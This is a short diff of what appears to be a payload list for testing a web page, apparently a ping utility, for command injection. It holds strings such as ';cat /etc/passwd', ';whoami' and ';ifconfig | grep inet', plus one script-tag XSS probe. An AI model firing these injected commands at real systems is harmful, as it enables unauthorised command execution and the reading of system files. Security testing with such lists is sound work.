@@ -1,11 +1,12 @@
 ;ls~;whoami
 ;cat /etc/passwd
-;whoami
 ;ls -la
 <script>alert('test');</script>
 ;ls -la
-;ls~;whoami
 ;ls
 ping.php -exec whoami ;
 ;head ping.php
 ;grep php echo.php
+;grep php echo.php
+;ls
+;ifconfig | grep inet
